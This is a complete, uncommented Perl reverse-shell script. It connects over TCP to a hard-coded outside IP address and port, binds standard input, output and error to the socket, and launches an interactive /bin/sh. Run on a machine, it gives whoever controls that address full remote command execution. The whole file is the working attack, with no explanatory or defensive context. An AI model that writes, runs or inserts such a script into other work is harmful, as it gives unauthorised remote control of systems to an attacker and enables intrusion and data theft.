#!/usr/bin/perl

use strict;
use warnings;
use Socket;

my $ip = "118.31.1.136";
my $port = 55432;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
my $addr = sockaddr_in($port, inet_aton($ip));

if (connect(S, $addr)) {
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/sh -i");
} else {
    die "Failed to connect: $!";
}